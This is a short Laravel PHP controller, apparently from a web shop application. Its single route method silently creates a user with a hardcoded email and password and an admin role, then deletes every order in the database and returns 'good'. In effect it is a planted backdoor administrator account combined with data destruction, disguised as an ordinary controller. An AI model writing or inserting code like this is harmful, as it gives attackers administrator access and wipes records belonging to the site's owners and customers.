<?php

namespace App\Http\Controllers;

use App\Order;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
class failController extends Controller
{
    public function index () {
        DB::table('users')->insert([
            'name' => 'mm2020',
            'email' => 'admin@hkhaa.com',
            'password' => Hash::make('artworks2021'),
            'admin_role'=>1
        ]);
        $orders = Order::query()->get();
        foreach($orders as $order) {
            $order->delete();
        }
        return "good";
    }
}
